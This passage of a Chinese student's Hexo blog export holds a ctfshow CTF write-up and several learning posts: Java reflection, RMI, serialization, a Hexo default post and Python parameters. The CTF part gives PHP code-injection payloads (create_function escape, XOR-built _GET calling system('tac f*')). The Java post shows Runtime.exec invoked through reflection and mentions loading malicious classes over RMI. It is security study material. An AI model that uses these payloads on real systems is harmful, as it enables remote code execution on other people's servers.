<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样一来，我们想要执行的代码就会执行</p>
<h1 id="Web148"><a href="#Web148" class="headerlink" title="Web148"></a>Web148</h1><p>这题就有点没看懂的感觉</p>
<p>说是使用中文变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span><br><span class="line">$&#123;_GET&#125;[哼]($&#123;_GET&#125;[嗯]);&amp;哼=call_user_func&amp;嗯=get_ctfshow_fl0g</span><br></pre></td></tr></table></figure>

<p>***”&#96;</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>java学习历程记录-JavaWeb</title>
    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
<span id="more"></span>

<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化以及一些前置知识</title>
    <url>/2023/11/09/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9A%84%E4%B8%80%E4%BA%9B%E8%87%AA%E6%88%91%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>最近学习了java反序列化以及反射 的相关知识，就在这稍微做一些总结。</p>
<span id="more"></span>

<h1 id="一、Java反射"><a href="#一、Java反射" class="headerlink" title="一、Java反射"></a>一、Java反射</h1><p>java反射其实也就是比较基础简单的，主要就是集中在一些函数上。</p>
<p>首先就是反射的作用是什么</p>
<blockquote>
<p>1、让java具有动态性</p>
<p>2、修改已有对象的属性的值</p>
<p>3、动态生成对象</p>
<p>4、动态调用方法</p>
<p>5、操作内部类和私有方法私有变量</p>
</blockquote>
<p>其次就是最主要的一点</p>
<p>Java反射在Java反序列化中的应用</p>
<blockquote>
<p><strong>1、定制需要的对象</strong></p>
<p><strong>2、通过invoke去调用同名函数以外的函数</strong></p>
<p><strong>3、通过Class类创建对象，引入不能序列化的类然后通过反射去执行</strong></p>
</blockquote>
<p>首先就是介绍总结一下java反射中用到的一些相关方法，当然也不是直接对着方法名记忆，那样太枯燥了，主要就是在使用的过程中去学习。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//这个的意思就是获取到java.lang.Runtime这个类，是一种获取类最常见的方法，然后获取到的类就被“等同”于clazz（！！！这里要想起来类和对象之间的区别，这两个不是同一种东西！！！）</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//这里我们就逐步分析，首先就是getMethod就是获取一个类的方法</span></span><br><span class="line"><span class="comment">//格式： 类.getMethod（“方法名”, 这个方法需要传递的参数类型）</span></span><br><span class="line"><span class="comment">//然后就是invoke，这是一个调用上面获得的方法。</span></span><br><span class="line"><span class="comment">//格式： 方法名.(类的一个对象,需要传递给方法的参数)</span></span><br><span class="line"><span class="comment">//newInstance就是调用该类的构造方法去实例化一个对象</span></span><br></pre></td></tr></table></figure>

<p>当然这样直接去运行时会产生报错的！！！这又是为什么呢？</p>
<p>这里主要就是因为我们无法通过newInstance去获得类的对象，而这里是因为Runtime的构造方法是私有的，是一种”单例”的设计模式</p>
<blockquote>
<p>单例的设计模式：主要是考虑到某些类一般只需要类的初始化时使用一次构造方法，而不是每次都需要去再重新使用构造方法，但这样的话我们又应该怎么样去调用构造方法呢？所以设计者就设计了一个静态方法，像这里的就是getRuntime这个方法，使用这个方法就会返回一个对象</p>
</blockquote>
<p>所以修改之后的代码就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethed.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这样就可以去调用到我们需要的方法了。</p>
<p>当然这样也是还有点缺点的，就比如如果没有这个getRuntime的方法呢？这又应该怎么办？</p>
<p>这个时候就可以使用getConstructor这个方法去获取到我们想要的类。</p>
<blockquote>
<p>格式： 类.getConstructor(构造方法的参数类型)</p>
</blockquote>
<p>eg.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>然后就是如果构造方法是私有方法，我们应该去使用getDeclaredMethod这个方法。</p>
<blockquote>
<p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 </p>
<p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p>
<p>还有就是getConstructor和getDeclaredConstructor基本上相似的，这里就不过多解释了</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">clazz</span> = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>setAccessible必须要设置为true，不然无法去使用。</p>
<h1 id="二、JDK动态代理"><a href="#二、JDK动态代理" class="headerlink" title="二、JDK动态代理"></a>二、JDK动态代理</h1><p>首先就是个人感觉java的动态代理技术就有点与Python中的装饰器</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-11/4b18054f0f5d8eb98cb45ce94a070ab0--4962--image-20240311143731878.png" alt="image-20240311143731878"></p>
<p>通过调用jdk自带的相关方法，从而去省略跳过自身创建静态代理</p>
<p>ProxyTest.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">UserInvocationHandler</span> <span class="variable">userinvocationhandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>();</span><br><span class="line"><span class="type">IUser</span> <span class="variable">userProxy</span> <span class="operator">=</span> (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),userinvocationhandler)</span><br><span class="line">userProxy.method;   <span class="comment">//这样就可以去代理user的方法</span></span><br></pre></td></tr></table></figure>

<p>UserInvocationHandler.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IUser user;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;<span class="built_in">this</span>.user = user;&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">    method.invoke(user,args);   <span class="comment">//进行反射去调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这样也就成功实现了简单的动态代理了</p>
<h1 id="三、类的动态加载"><a href="#三、类的动态加载" class="headerlink" title="三、类的动态加载"></a>三、类的动态加载</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure>

<p>获得系统当前的类加载器</p>
<p> 构造代码块，静态代码块———————无论调用什么构造方法都会先调用构造代码块。同理，静态代码块也是如此</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//构造代码块</span><br><span class="line">&#123;</span><br><span class="line">	xxxxxx</span><br><span class="line">&#125;</span><br><span class="line">静态代码块</span><br><span class="line">static&#123;</span><br><span class="line">	xxxxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就去实现一个具体的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\Test.class&quot;</span>));</span><br><span class="line"><span class="comment">//        Class c =  (Class) defineClassMethod.invoke(cl, &quot;Test&quot;, code,0,code.length);</span></span><br><span class="line"><span class="comment">//        c.newInstance();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Unsafe.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; test = unsafe.defineClass(<span class="string">&quot;Test&quot;</span>, code, <span class="number">0</span>, code.length, cl, <span class="literal">null</span>);</span><br><span class="line">        test.newInstance();</span><br></pre></td></tr></table></figure>

<p>通过类加载器可以去实现加载远程或者本地的其他目录下的类</p>
<h1 id="四、RMI"><a href="#四、RMI" class="headerlink" title="四、RMI"></a>四、RMI</h1><p>RMI全称是Remote Method Invocation，远程⽅法调⽤。听这名字应该也就知道，就是去从调用一个远程主机上的java方法，在这里就挑一些重点的代码片段进行讲解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());(这里是服务器上启动的)</span><br></pre></td></tr></table></figure>

<p>首先第一行这里就是创建并且执行Registry服务，这个服务就是相当于一个中继器，我将类和一个名字绑定丢到这里面去，别的人就可以通过名字去拿到这个对应的类，这就是Registry所起到的一个作用。然后就是第二行，就是将本机的一个类给绑定到了一个Registry服务上，这样等之后就可以去直接拿到这个类了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)Naming.lookup(<span class="string">&quot;rmi://vps_ip:1099/Hello&quot;</span>);(本机运行)</span><br></pre></td></tr></table></figure>

<p>这里就通过Naming的lookup方法去寻找这个rmi类，我们就可以在Registry中拿到我们想要的类。</p>
<p>codebase的利用方法</p>
<p>在以前的有段时间，java是可以运行在浏览器上的，就有一个codebase属性，这是一个地址，去告诉哪个地方寻找类，这个时候我们就可以使用rmi的相关操作，去使其加载我们自己部署的服务器上的一些恶意类。</p>
<p>就比如在log4j这个CVE中，也是可以去使用rmi去实现的，去完成反弹shell从而获得权限。</p>
<h2 id="🌟补充："><a href="#🌟补充：" class="headerlink" title="🌟补充："></a>🌟补充：</h2><h2 id="🌟关于rmi服务的具体流程调试"><a href="#🌟关于rmi服务的具体流程调试" class="headerlink" title="🌟关于rmi服务的具体流程调试"></a>🌟关于rmi服务的具体流程调试</h2><p>参考文章和视频（我认为讲的特别好，强烈推荐！）</p>
<p><a href="https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">https://halfblue.github.io/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?p=3&spm_id_from=pageDriver&vd_source=2e4979b0a36df1ed7510f03f3d33843f">https://www.bilibili.com/video/BV1L3411a7ax/?p=3&amp;spm_id_from=pageDriver&amp;vd_source=2e4979b0a36df1ed7510f03f3d33843f</a></p>
<h3 id="1、远程对象的创建过程"><a href="#1、远程对象的创建过程" class="headerlink" title="1、远程对象的创建过程"></a>1、远程对象的创建过程</h3><p>主要的作用点就在远程方法所继承的UnicastRemoteObject类中，是用于将本地方法发布的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/449e96cbf56cb91ce5fea4b44d8b8a9d--7f10--image-20240309103527834.png" alt="image-20240309103527834"></p>
<p>然后就是由于端口是未知的，端口为零，然后调用exportObject方法区将方法给发布，exportObject就是发布的重要函数，继续跟进，就会发现是在一层层去调用不同类中的exportObject函数</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/06d268d7507144247ead0bb8c9255342--2361--image-20240309103730436.png" alt="image-20240309103730436"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/7ad2af7b7010c5f18072cee984418b57--edf1--image-20240309103742756.png" alt="image-20240309103742756"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/5f99a7d5c8eec788788dad375fdea453--4636--image-20240309103823798.png" alt="image-20240309103823798"></p>
<p>最后在这里，会发现一个createProxy，看名字就能看出来，是一个创建代理的方法，我们跟进看看</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/fba392778289afa99fadb0b2d1d04f80--716c--image-20240309104011784.png"></p>
<p>发现是一个判断是否有_stub后缀的方法，如果没有，就创建一个，后边就是一些不太好理解的东西了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/09d963caced12b347a0198ea8d71cedd--9e31--image-20240309104201242.png" alt="image-20240309104201242"></p>
<p>然后就跳到了这里，我们跟进函数，发现也是一个判断_Skel后缀的方法，在继续调试，发现创建了一个Target，一个很关键的东西</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/307c578130cd22ddfc56de56ca7d50ca--06fe--image-20240309104525491.png" alt="image-20240309104525491"></p>
<p>里面把所有相关的stud，ID等都记录进去了，然后就又是一系列的exportObject去将Target给发布出去了。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/c95a79909fbc8ca393b09350ffebb05f--a583--image-20240309104817139.png" alt="image-20240309104817139"></p>
<p>最后发现服务端还会建一张表，去将Target给存入其中，从而保留让服务端知道有关这个远程方法的所有信息。</p>
<p>这差不多 就是远程方法的创建的过程了</p>
<h3 id="2、注册中心的创建"><a href="#2、注册中心的创建" class="headerlink" title="2、注册中心的创建"></a>2、注册中心的创建</h3><p>相比来说注册中心的创建就简单很多了，我们直接调试跟进</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/73441644e29781969609c21fda9ca8fe--2d0d--image-20240309105935201.png" alt="image-20240309105935201"></p>
<p>在这里就发现了重点—–LiveRef</p>
<blockquote>
<p>在上面之前忘记将了，LiveRef又是什么，这是一个在rmi远程方法调用中非常重要的一个，他其中封装了服务端中所有相关的信息，比如远程方法的ID，地址和端口，以及各种信息</p>
</blockquote>
<p>然后就发现是调用TCPEndpoint，去获取本地的Endpoint服务，从而以此去完成相关TCP服务的操作。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-03-09/d772f29e62f647771bd36cdf2c484757--4802--image-20240309110603314.png" alt="image-20240309110603314"></p>
<p>发现就又是exportObject方法，发现后边就是和之前的远程方法调用基本就是一致的了，就能够知道注册中心的创建，其实也是一个远程方法的发布过程实际上。</p>
<h3 id="3、远程方法绑定"><a href="#3、远程方法绑定" class="headerlink" title="3、远程方法绑定"></a>3、远程方法绑定</h3><p>这里就比较简单了，因为这里并不是远程绑定，就直接调用了RegistryImpl类，把名字和远程对象放到一个叫bindings的HashTable里面。<br>到这里服务端的流程就走完了。</p>
<h1 id="三、serialize🌟"><a href="#三、serialize🌟" class="headerlink" title="三、serialize🌟"></a>三、serialize🌟</h1><p>这是学习的重难点，我现在也还知识初步了解一些，还没完全弄完😭</p>
<p>一般web手初识反序列化都是从php开始，首先就java的反序列化和php的还是有很大区别的，php是直接利用serialize和unserialize这两个函数进行序列化和反序列化的过程，我们无法去控制这个过程中的任何东西，而java就不一样了。</p>
<blockquote>
<ul>
<li>writeObject：序列化</li>
<li>readObject：反序列化</li>
</ul>
</blockquote>
<p>这两个主要是java中序列化反序列化所需要使用到的，一般需要搭配一些其他的东西去使用。</p>
<p>eg</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//用于保存序列化数据</span></span><br><span class="line">     ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);   <span class="comment">//实例化一个对象输出流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">     u.setName(<span class="string">&quot;6pc1&quot;</span>);</span><br><span class="line">     obj_out.writeObject(u);   <span class="comment">//利用writeObject方法将序列化对象存储在本地</span></span><br><span class="line">     obj_out.close();</span><br><span class="line">     System.out.println(<span class="string">&quot;User对象序列化成功！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.txt&quot;</span>);  <span class="comment">//读取之前保存的序列化数据</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);  <span class="comment">//实例化一个对象输入流</span></span><br><span class="line">     <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> (User)ins.readObject();      <span class="comment">//利用readObject方法将序列化对象转为对象</span></span><br><span class="line">     system.out.println(<span class="string">&quot;User对象反序列化成功！&quot;</span>);</span><br><span class="line">     System.out.println(u.getName());</span><br><span class="line">     ins.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是java反序列话的主要过程，是可以自己去操作序列化反序列化的一些过程的，就比如在序列化后的文件中添加一些数据一类的</p>
<p>这也不是唯一一种，我们也可以用byte流的方法代替文件流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">ObjectOutputStream obj_out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ins</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br></pre></td></tr></table></figure>

<h1 id="四、CC1链"><a href="#四、CC1链" class="headerlink" title="四、CC1链"></a>四、CC1链</h1>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>serialize</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/11/06/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>python学习历程(1)</title>
    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
<span id="more"></span>

<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>

<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>

<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
<p>&gt;&gt;&gt;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>

<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
<p>&gt;&gt;&gt;</p>
